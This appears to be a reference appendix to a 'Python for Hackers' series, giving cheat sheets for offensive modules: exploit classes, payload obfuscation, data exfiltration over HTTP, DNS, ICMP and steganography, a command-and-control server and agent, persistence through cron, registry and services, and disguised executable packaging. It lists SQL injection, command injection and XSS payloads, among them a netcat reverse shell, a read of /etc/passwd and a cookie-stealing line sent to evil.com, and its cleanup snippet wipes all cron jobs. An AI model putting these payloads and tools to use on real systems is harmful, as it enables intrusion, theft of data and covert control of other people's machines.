# Appendix A: Complete Reference Documentation

## API Reference & Cheat Sheets

This appendix provides comprehensive reference documentation for all modules created in the Python for Hackers series.

---

## Table of Contents

1. [Network Programming Reference](#network-programming-reference)
2. [HTTP Client Reference](#http-client-reference)
3. [Web Reconnaissance Reference](#web-reconnaissance-reference)
4. [Exploit Development Reference](#exploit-development-reference)
5. [Obfuscation Reference](#obfuscation-reference)
6. [Exfiltration Reference](#exfiltration-reference)
7. [C2 Framework Reference](#c2-framework-reference)
8. [Enumeration Reference](#enumeration-reference)
9. [Persistence Reference](#persistence-reference)
10. [Packaging Reference](#packaging-reference)
11. [Common Patterns & Snippets](#common-patterns--snippets)
12. [Troubleshooting Guide](#troubleshooting-guide)

---

## Network Programming Reference

### Socket Programming Basics

#### Creating Sockets

```python
import socket

# TCP Socket
tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# UDP Socket
udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# Raw Socket (requires root)
raw_socket = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0800))
```

#### Socket Methods

| Method | Description | Example |
|--------|-------------|---------|
| `socket.bind((host, port))` | Bind to address | `sock.bind(('0.0.0.0', 9999))` |
| `socket.listen(backlog)` | Listen for connections | `sock.listen(5)` |
| `socket.accept()` | Accept connection | `client, addr = sock.accept()` |
| `socket.connect((host, port))` | Connect to server | `sock.connect(('127.0.0.1', 9999))` |
| `socket.send(data)` | Send data | `sock.send(b'Hello')` |
| `socket.recv(buffer)` | Receive data | `data = sock.recv(1024)` |
| `socket.sendto(data, addr)` | Send UDP | `sock.sendto(b'Hello', ('127.0.0.1', 9998))` |
| `socket.recvfrom(buffer)` | Receive UDP | `data, addr = sock.recvfrom(1024)` |
| `socket.close()` | Close socket | `sock.close()` |
| `socket.settimeout(seconds)` | Set timeout | `sock.settimeout(5.0)` |

#### Common Port Numbers

| Port | Service | Port | Service |
|------|---------|------|---------|
| 20 | FTP Data | 443 | HTTPS |
| 21 | FTP | 445 | SMB |
| 22 | SSH | 993 | IMAPS |
| 23 | Telnet | 995 | POP3S |
| 25 | SMTP | 1723 | PPTP |
| 53 | DNS | 3306 | MySQL |
| 80 | HTTP | 3389 | RDP |
| 110 | POP3 | 5432 | PostgreSQL |
| 111 | RPC | 5900 | VNC |
| 135 | MSRPC | 6379 | Redis |
| 139 | NetBIOS | 8080 | HTTP Proxy |
| 143 | IMAP | 8443 | HTTPS Alt |

### Scapy Reference

#### Creating Packets

```python
from scapy.all import *

# IP Packet
ip = IP(src="192.168.1.1", dst="8.8.8.8", ttl=64)

# TCP Packet
tcp = TCP(sport=12345, dport=80, flags="S")

# UDP Packet
udp = UDP(sport=12345, dport=53)

# ICMP Packet
icmp = ICMP(type=8, code=0)

# Combine Layers
packet = ip / tcp
packet = ip / udp
packet = ip / icmp

# Ethernet Frame
eth = Ether(src="00:11:22:33:44:55", dst="aa:bb:cc:dd:ee:ff")
packet = eth / ip / tcp
```

#### Common Scapy Functions

| Function | Description | Example |
|----------|-------------|---------|
| `send(packet)` | Send packets | `send(ip/tcp)` |
| `sr1(packet)` | Send and receive 1 response | `response = sr1(packet)` |
| `sr(packet)` | Send and receive responses | `answers, _ = sr(packet)` |
| `sniff(count=n)` | Sniff packets | `pkts = sniff(count=10)` |
| `wrpcap(file, pkts)` | Save to PCAP | `wrpcap('capture.pcap', pkts)` |
| `rdpcap(file)` | Load from PCAP | `pkts = rdpcap('capture.pcap')` |
| `packet.show()` | Display packet | `packet.show()` |
| `packet.summary()` | Short summary | `packet.summary()` |

#### TCP Flags

| Flag | Symbol | Description |
|------|--------|-------------|
| SYN | S | Synchronize (start connection) |
| ACK | A | Acknowledge |
| FIN | F | Finish (close connection) |
| RST | R | Reset (abort connection) |
| PSH | P | Push (immediate delivery) |
| URG | U | Urgent |

```python
# Flag combinations
tcp = TCP(flags="SA")  # SYN-ACK
tcp = TCP(flags="A")   # ACK only
tcp = TCP(flags="FA")  # FIN-ACK
```

---

## HTTP Client Reference

### HTTPClient Class

```python
from http_client import HTTPClient

# Create client
client = HTTPClient(
    base_url="https://api.example.com",
    timeout=30,
    max_retries=3,
    user_agent="Custom User-Agent",
    verify_ssl=False
)
```

#### Methods

| Method | Description | Example |
|--------|-------------|---------|
| `get(url, params)` | GET request | `client.get('/users', {'id': 1})` |
| `post(url, data, json_data)` | POST request | `client.post('/login', json_data={'user':'admin'})` |
| `put(url, data, json_data)` | PUT request | `client.put('/users/1', json_data={'name':'new'})` |
| `delete(url)` | DELETE request | `client.delete('/users/1')` |
| `head(url)` | HEAD request | `client.head('/page')` |
| `options(url)` | OPTIONS request | `client.options('/api')` |
| `patch(url, data, json_data)` | PATCH request | `client.patch('/users/1', json_data={'email':'new@email.com'})` |
| `set_header(name, value)` | Set header | `client.set_header('X-API-Key', 'abc123')` |
| `set_cookie(name, value)` | Set cookie | `client.set_cookie('session', 'abcdef')` |
| `set_auth_basic(user, pass)` | Basic auth | `client.set_auth_basic('admin', 'password')` |
| `set_auth_bearer(token)` | Bearer token | `client.set_auth_bearer('jwt_token')` |
| `set_auth_api_key(key, header)` | API key | `client.set_auth_api_key('abc123', 'X-API-Key')` |
| `parse_response(response)` | Parse response | `info = client.parse_response(response)` |
| `get_stats()` | Get statistics | `stats = client.get_stats()` |

#### Request Parameters

```python
# Common request parameters
response = client.get(
    url='/search',
    params={'q': 'test', 'page': 1},  # Query parameters
    headers={'X-Custom': 'value'},     # Custom headers
    cookies={'session': 'abc123'},     # Cookies
    timeout=10,                         # Custom timeout
    allow_redirects=False               # Don't follow redirects
)
```

### Session Management

```python
# Persistent session with cookies
client = HTTPClient('https://example.com')
response = client.post('/login', data={'user': 'admin', 'pass': 'password'})

# Session is maintained automatically
response = client.get('/dashboard')  # Already authenticated

# Clear session
client.session.cookies.clear()

# Save session
import pickle
with open('session.pkl', 'wb') as f:
    pickle.dump(client.session, f)

# Load session
with open('session.pkl', 'rb') as f:
    client.session = pickle.load(f)
```

---

## Web Reconnaissance Reference

### DirectoryBruteForcer Class

```python
from brute_forcer import DirectoryBruteForcer

forcer = DirectoryBruteForcer(
    target_url="https://example.com",
    wordlist=['admin', 'login', 'backup'],
    extensions=['.php', '.html'],
    threads=50,
    timeout=10,
    follow_redirects=False,
    recursive=True,
    max_depth=3,
    exclude_statuses=[404]
)
```

#### Methods

| Method | Description |
|--------|-------------|
| `scan()` | Execute the brute force scan |
| `print_results(sort_by, show_titles)` | Print formatted results |
| `save_results(filename)` | Save results to JSON |

### HTMLAnalyzer Class

```python
from html_analyzer import HTMLAnalyzer

analyzer = HTMLAnalyzer(client=client)

# Analyze a URL
analysis = analyzer.analyze_url('https://example.com')

# Access results
print(analysis.title)
print(analysis.forms)
print(analysis.links)
print(analysis.comments)
print(analysis.emails)
print(analysis.potential_sensitive)
```

#### HTMLAnalysis Attributes

| Attribute | Type | Description |
|-----------|------|-------------|
| `url` | str | URL analyzed |
| `title` | str | Page title |
| `meta_data` | dict | Meta tags |
| `forms` | list | Form information |
| `links` | list | All links |
| `scripts` | list | Script tags |
| `styles` | list | Stylesheets |
| `images` | list | Images |
| `comments` | list | HTML comments |
| `emails` | list | Email addresses |
| `phone_numbers` | list | Phone numbers |
| `potential_sensitive` | list | Sensitive data |
| `endpoints` | list | API endpoints |
| `csp` | dict | Content Security Policy |
| `iframes` | list | Iframes |
| `vulnerabilities` | list | Potential vulnerabilities |

---

## Exploit Development Reference

### Base Exploit Class

```python
from exploit_framework import Exploit

class CustomExploit(Exploit):
    def __init__(self, target, **kwargs):
        super().__init__("Exploit Name", "Description", target, **kwargs)
        self.vulnerability_type = "Type"
    
    def exploit(self):
        # Implement exploit logic
        return ExploitResult(
            success=True,
            vulnerability_type=self.vulnerability_type,
            target=self.target,
            payload="payload",
            output="result"
        )
```

### Exploit Manager

```python
from exploit_framework import ExploitManager

manager = ExploitManager(target='https://example.com')

# Add exploits
manager.add_exploit(SQLInjectionExploit(target, parameter='id'))
manager.add_exploit(CommandInjectionExploit(target, parameter='cmd'))

# Run all
results = manager.run_all(verbose=True)

# Get vulnerabilities
vulns = manager.get_vulnerabilities()

# Generate report
report = manager.get_report()
```

### Common Exploit Patterns

#### SQL Injection Payloads

```python
payloads = [
    "' OR '1'='1",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "'; DROP TABLE users--",
    "' OR 1=1--",
    "admin'--",
    "' OR '1'='1' ;--",
    "1' AND 1=1--",
    "1' AND 1=2--",
    "' AND '1'='1",
    "1' ORDER BY 1--",
    "1' ORDER BY 2--"
]
```

#### Command Injection Payloads

```python
payloads = [
    "; ls",
    "| ls",
    "|| ls",
    "; whoami",
    "| whoami",
    "&& whoami",
    "`id`",
    "$(id)",
    "; cat /etc/passwd",
    "| nc -e /bin/sh 192.168.1.100 4444"
]
```

#### XSS Payloads

```python
payloads = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<body onload=alert(1)>",
    "<svg onload=alert(1)>",
    "javascript:alert(1)",
    "data:text/html,<script>alert(1)</script>",
    "document.location='http://evil.com/steal?cookie='+document.cookie"
]
```

---

## Obfuscation Reference

### ObfuscationEngine Methods

```python
from obfuscator import ObfuscationEngine

obfuscator = ObfuscationEngine(seed=42)
```

| Method | Description | Example |
|--------|-------------|---------|
| `encode_base64(data)` | Base64 encode | `obfuscator.encode_base64('whoami')` |
| `encode_hex(data)` | Hex encode | `obfuscator.encode_hex('whoami')` |
| `encode_xor(data, key)` | XOR encode | `obfuscator.encode_xor('whoami', 'secret')` |
| `encode_rot13(data)` | ROT13 encode | `obfuscator.encode_rot13('whoami')` |
| `encode_url(data)` | URL encode | `obfuscator.encode_url('whoami')` |
| `encode_html(data)` | HTML encode | `obfuscator.encode_html('whoami')` |
| `encode_unicode(data)` | Unicode encode | `obfuscator.encode_unicode('whoami')` |
| `encode_reverse(data)` | Reverse string | `obfuscator.encode_reverse('whoami')` |
| `encode_compress(data)` | Zlib compress | `obfuscator.encode_compress('whoami')` |
| `encode_caesar(data, shift)` | Caesar cipher | `obfuscator.encode_caesar('whoami', 3)` |
| `multi_encode(data, techniques)` | Multiple encodings | `obfuscator.multi_encode('whoami', ['base64', 'hex'])` |

### PayloadGenerator Methods

```python
from obfuscator import PayloadGenerator

generator = PayloadGenerator()

# Generate payload
result = generator.generate_payload('whoami', encoding=['base64', 'hex'])

# Generate SQL payloads
sql_payloads = generator.generate_sql_payloads()

# Generate XSS payloads
xss_payloads = generator.generate_xss_payloads()

# Generate reverse shells
shells = generator.generate_reverse_shells('192.168.1.100', 4444)

# Generate random payload
random_payload = generator.generate_random_payload('whoami', encoding_depth=3)
```

### Common Obfuscation Techniques

| Technique | Output Example |
|-----------|---------------|
| Base64 | `d2hvYW1p` |
| Hex | `77686f616d69` |
| XOR (key: secret) | `1a2b3c4d5e6f` |
| ROT13 | `jubnzv` |
| URL | `%77%68%6f%61%6d%69` |
| HTML | `&#119;&#104;&#111;&#97;&#109;&#105;` |
| Unicode | `\u0077\u0068\u006f\u0061\u006d\u0069` |
| Reverse | `imaohw` |
| Compressed | `x\x9c\xcbH\xcd\xc9\xc9...` |

---

## Exfiltration Reference

### ExfiltrationManager

```python
from exfiltration import ExfiltrationManager

manager = ExfiltrationManager()

# Add channels
http_id = manager.add_channel('http', {
    'url': 'http://example.com/exfil',
    'method': 'POST',
    'param_name': 'data'
})

dns_id = manager.add_channel('dns', {
    'domain': 'example.com',
    'dns_server': '8.8.8.8',
    'chunk_size': 20
})

icmp_id = manager.add_channel('icmp', {
    'target': '8.8.8.8',
    'chunk_size': 16
})

stego_id = manager.add_channel('steganography', {
    'image_path': 'cover.png',
    'output_path': 'stego.png',
    'method': 'lsb'
})

# Start channels
manager.start_channel(http_id)

# Send data
manager.send_data(http_id, b'secret data')
manager.send_data_all(b'secret data')  # All active channels

# Exfiltrate file
manager.exfiltrate_file('secret.txt', http_id)

# Get status
status = manager.get_status()
```

### Channel Configuration

#### HTTP Channel
```python
config = {
    'url': 'http://example.com/exfil',
    'method': 'POST',  # GET or POST
    'param_name': 'data',
    'headers': {'User-Agent': 'Mozilla/5.0'}
}
```

#### DNS Channel
```python
config = {
    'domain': 'example.com',
    'dns_server': '8.8.8.8',
    'chunk_size': 20,  # Max subdomain length
    'delay': 0.1
}
```

#### ICMP Channel
```python
config = {
    'target': '8.8.8.8',
    'chunk_size': 16
}
```

#### Steganography Channel
```python
config = {
    'image_path': 'cover_image.png',
    'output_path': 'stego_image.png',
    'method': 'lsb'
}
```

---

## C2 Framework Reference

### C2Server

```python
from c2_server import C2Server

server = C2Server({
    'host': '0.0.0.0',
    'http_port': 8443,
    'log_level': 'INFO',
    'db_path': 'c2_database.db'
})

server.start()
```

#### API Endpoints

| Endpoint | Method | Description |
|----------|--------|-------------|
| `/c2/register` | POST | Register agent |
| `/c2/tasks/<agent_id>` | GET | Get pending tasks |
| `/c2/result` | POST | Submit result |
| `/c2/agents` | GET | List all agents |
| `/c2/agent/<agent_id>` | GET | Get agent info |
| `/c2/task` | POST | Add task |
| `/c2/results/<agent_id>` | GET | Get agent results |

#### Adding Tasks via API

```bash
curl -X POST http://localhost:8443/c2/task \
  -H "Content-Type: application/json" \
  -d '{"agent_id":"abc123","command":"whoami","description":"Get user"}'
```

### C2Agent

```python
from c2_agent import C2Agent

agent = C2Agent({
    'agent_id': 'custom_id',
    'c2_url': 'http://localhost:8443',
    'beacon_interval': 30,
    'heartbeat_interval': 60
})

agent.start()
```

#### Built-in Commands

| Command | Description | Parameters |
|---------|-------------|------------|
| `whoami` | Get current user | None |
| `hostname` | Get system hostname | None |
| `platform` | Get OS platform | None |
| `ip` | Get IP address | None |
| `info` | Get full agent info | None |
| `ls` | List directory | `path` |
| `who` | Show logged-in users | None |
| `system` | Execute shell command | `cmd` |
| `download` | Download file | `file` |
| `sleep` | Sleep for seconds | `seconds` |
| `beacon` | Set beacon interval | `interval` |
| `exit` | Stop agent | None |

---

## Enumeration Reference

### SystemEnumerator

```python
from enumerator import SystemEnumerator

enumerator = SystemEnumerator(verbose=True)

# Get system info
system_info = enumerator.get_system_info()
print(system_info.hostname)
print(system_info.os_name)

# Get users
users = enumerator.get_users()
for user in users:
    print(user.username, user.groups)

# Get processes
processes = enumerator.get_processes(include_connections=True)
for proc in processes:
    print(proc.name, proc.pid)

# Get services
services = enumerator.get_services()

# Get cron jobs
cron_jobs = enumerator.get_cron_jobs()

# Get environment
env = enumerator.get_environment()

# Get security info
security = enumerator.get_security_info()

# Complete enumeration
all_info = enumerator.enumerate_all()
enumerator.save_report(all_info, 'report.json')
```

### SystemInfo Attributes

| Attribute | Type | Description |
|-----------|------|-------------|
| `hostname` | str | System hostname |
| `os_name` | str | Operating system |
| `os_version` | str | OS version |
| `kernel_version` | str | Kernel version |
| `architecture` | str | System architecture |
| `cpu_count` | int | Number of CPUs |
| `memory_total` | int | Total memory (bytes) |
| `memory_available` | int | Available memory (bytes) |
| `disk_usage` | dict | Disk usage information |
| `network_interfaces` | list | Network interfaces |

---

## Persistence Reference

### PersistenceManager

```python
from persistence import PersistenceManager

manager = PersistenceManager(verbose=True, dry_run=False)

# Install payload
manager.install_payload('payload.exe', 'system_helper.exe')

# Add persistence methods
manager.add_startup_script()        # All platforms
manager.add_cron_job('@reboot')     # Linux only
manager.add_scheduled_task('Helper') # Windows only
manager.add_registry_entry('Helper') # Windows only
manager.add_service('SystemHelper')  # All platforms

# Install all methods
manager.add_all_persistence('payload.exe')

# Clean up
manager.cleanup()

# Get status
status = manager.get_status()
```

### ReportGenerator

```python
from persistence import ReportGenerator

report = ReportGenerator("Operation Name")

# Log events
report.log_event('info', 'Starting operation')
report.log_event('success', 'Task completed')
report.log_event('error', 'Error occurred')

# Add data
report.add_data('hostname', 'target-server')
report.add_data('users', ['admin', 'user'])

# Generate report
json_report = report.generate_report(format='json')
text_report = report.generate_report(format='text')
html_report = report.generate_report(format='html')

# Save report
with open('report.json', 'w') as f:
    f.write(json_report)
```

---

## Packaging Reference

### PackageBuilder

```python
from packager import PackageBuilder

builder = PackageBuilder(verbose=True)

# Build with specific tool
exe_path = builder.build_pyinstaller(
    'script.py',
    {
        'name': 'AppName',
        'console': False,
        'icon': 'app.ico',
        'hidden_imports': ['requests', 'psutil'],
        'excludes': ['tkinter', 'test']
    }
)

# Build with all tools
results = builder.build_all('script.py', config)

# Compress with UPX
builder.compress_executable(exe_path)

# Sign executable (Windows)
builder.sign_executable(exe_path, {
    'certificate': 'cert.pfx',
    'password': 'password'
})

# Cleanup
builder.cleanup()
```

### Build Configuration Options

```python
config = {
    # Basic
    'name': 'AppName',
    'console': True,  # False for GUI apps
    
    # Icons & Metadata
    'icon': 'app.ico',
    'version': '1.0.0.0',
    'description': 'System Utility',
    
    # Dependencies
    'hidden_imports': ['requests', 'cryptography'],
    'excludes': ['tkinter', 'test', 'unittest'],
    'include_files': ['data.json', 'config.ini'],
    
    # Advanced
    'upx': True,  # Use UPX compression
    'debug': False,
    'strip': True
}
```

---

## Common Patterns & Snippets

### Error Handling Pattern

```python
import logging
import traceback

def safe_operation(func):
    def wrapper(*args, **kwargs):
        try:
            return func(*args, **kwargs)
        except Exception as e:
            logging.error(f"Error in {func.__name__}: {e}")
            logging.debug(traceback.format_exc())
            return None
    return wrapper

@safe_operation
def risky_function():
    # Code that might fail
    pass
```

### Thread Pool Pattern

```python
from concurrent.futures import ThreadPoolExecutor, as_completed

def process_item(item):
    # Process single item
    return result

with ThreadPoolExecutor(max_workers=10) as executor:
    futures = {executor.submit(process_item, item): item for item in items}
    
    for future in as_completed(futures):
        item = futures[future]
        try:
            result = future.result()
            print(f"Processed {item}: {result}")
        except Exception as e:
            print(f"Error processing {item}: {e}")
```

### Retry Pattern

```python
import time

def retry_operation(func, max_retries=3, delay=1):
    for attempt in range(max_retries):
        try:
            return func()
        except Exception as e:
            if attempt == max_retries - 1:
                raise
            time.sleep(delay * (2 ** attempt))
    return None
```

### Configuration Pattern

```python
import json
import yaml

def load_config(filename):
    if filename.endswith('.json'):
        with open(filename) as f:
            return json.load(f)
    elif filename.endswith('.yaml') or filename.endswith('.yml'):
        with open(filename) as f:
            return yaml.safe_load(f)
    else:
        raise ValueError(f"Unsupported config format: {filename}")

config = load_config('config.json')
```

### Logging Setup Pattern

```python
import logging
from logging.handlers import RotatingFileHandler

def setup_logging(name, log_file='app.log', level=logging.INFO):
    logger = logging.getLogger(name)
    logger.setLevel(level)
    
    # File handler with rotation
    file_handler = RotatingFileHandler(
        log_file, maxBytes=10*1024*1024, backupCount=5
    )
    file_handler.setFormatter(
        logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
    )
    logger.addHandler(file_handler)
    
    # Console handler
    console_handler = logging.StreamHandler()
    console_handler.setFormatter(
        logging.Formatter('%(levelname)s: %(message)s')
    )
    logger.addHandler(console_handler)
    
    return logger
```

---

## Troubleshooting Guide

### Common Issues and Solutions

#### 1. Socket Errors

| Error | Cause | Solution |
|-------|-------|----------|
| `ConnectionRefusedError` | Server not running | Start server or check port |
| `TimeoutError` | Server unresponsive | Increase timeout or check network |
| `PermissionError` | Need root | Run with `sudo` |
| `Address already in use` | Port in use | Use different port or kill process |

#### 2. HTTP Errors

| Status Code | Meaning | Solution |
|-------------|---------|----------|
| 401 Unauthorized | Missing auth | Add authentication headers |
| 403 Forbidden | Permission denied | Check credentials |
| 404 Not Found | URL doesn't exist | Check endpoint path |
| 429 Too Many Requests | Rate limited | Add delay or increase timeout |
| 500 Internal Server Error | Server error | Check request format |

#### 3. Package Installation Issues

```bash
# Common fixes
pip install --upgrade pip
pip install --upgrade setuptools wheel

# For Scapy on Linux
sudo apt install python3-scapy

# For Windows WMI
pip install pywin32 wmi

# For image processing
pip install Pillow
```

#### 4. Permission Issues

```bash
# Linux - Add user to necessary groups
sudo usermod -a -G wireshark $USER

# Grant raw socket capabilities
sudo setcap cap_net_raw=ep /usr/bin/python3

# Fix file permissions
chmod +x script.py
```

#### 5. Environment Issues

```bash
# Check Python version
python3 --version

# Check environment
pip list

# Recreate virtual environment
rm -rf venv
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
```

### Debugging Tips

1. **Enable Verbose Logging**
   ```python
   import logging
   logging.basicConfig(level=logging.DEBUG)
   ```

2. **Use pdb (Python Debugger)**
   ```python
   import pdb
   pdb.set_trace()  # Breakpoint
   ```

3. **Print Packet Details**
   ```python
   packet.show()  # Full details
   packet.summary()  # Short summary
   hexdump(packet)  # Hex dump
   ```

4. **Test Connectivity**
   ```bash
   ping -c 4 192.168.100.20
   nc -zv 192.168.100.20 80
   curl -v http://192.168.100.20
   ```

5. **Check Firewall Status**
   ```bash
   # Linux
   sudo ufw status
   sudo iptables -L
   
   # Windows
   netsh advfirewall show allprofiles
   ```

### Emergency Recovery

```python
# Basic cleanup script
def emergency_cleanup():
    import os
    import shutil
    
    # Remove build directories
    for dir_name in ['build', 'dist', '__pycache__']:
        if os.path.exists(dir_name):
            shutil.rmtree(dir_name, ignore_errors=True)
    
    # Remove temp files
    for file in os.listdir('.'):
        if file.endswith('.pyc') or file.endswith('.pyo'):
            os.remove(file)
    
    # Remove persistence if needed
    os.system('crontab -r 2>/dev/null')  # Remove all cron jobs
    os.system('systemctl stop SystemHelper 2>/dev/null')  # Stop service
```

---

## Quick Reference Cards

### Network Cheat Sheet

```python
# TCP Server
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(('0.0.0.0', 9999))
server.listen(5)
client, addr = server.accept()
data = client.recv(1024)
client.send(data)
client.close()

# TCP Client
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(('192.168.1.1', 9999))
client.send(b'Hello')
data = client.recv(1024)
client.close()

# UDP Server
server = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
server.bind(('0.0.0.0', 9998))
data, addr = server.recvfrom(1024)
server.sendto(data, addr)

# UDP Client
client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
client.sendto(b'Hello', ('192.168.1.1', 9998))
data, addr = client.recvfrom(1024)
```

### Scapy Quick Reference

```python
# Create and send
packet = IP(dst="8.8.8.8") / ICMP()
send(packet)

# Sniff
packets = sniff(filter="icmp", count=10)
for pkt in packets:
    pkt.show()

# Scan
ans = sr1(IP(dst="8.8.8.8")/TCP(dport=80, flags="S"))
if ans and ans[TCP].flags == 0x12:
    print("Port 80 is open")
```

### HTTP Quick Reference

```python
# GET
response = requests.get('https://api.example.com/users', params={'id': 1})

# POST
response = requests.post('https://api.example.com/login', json={'user': 'admin'})

# Headers
response = requests.get('https://api.example.com', headers={'X-API-Key': 'abc123'})

# Session
session = requests.Session()
session.post('https://example.com/login', data={'user': 'admin', 'pass': 'pass'})
response = session.get('https://example.com/dashboard')
```

### Obfuscation Quick Reference

```python
import base64
import binascii

# Base64
encoded = base64.b64encode(b'hello').decode()
decoded = base64.b64decode(encoded)

# Hex
encoded = binascii.hexlify(b'hello').decode()
decoded = binascii.unhexlify(encoded)

# XOR
def xor(data, key):
    return bytes([a ^ b for a, b in zip(data, key * (len(data)//len(key)+1))])
encoded = xor(b'hello', b'key')
decoded = xor(encoded, b'key')
```

---

## Appendix A End

*This appendix serves as a comprehensive reference for all modules, classes, and functions developed throughout the Python for Hackers series. Use it for quick lookups, troubleshooting, and as a guide for extending the framework.*

---

**[APPENDIX A COMPLETE]**
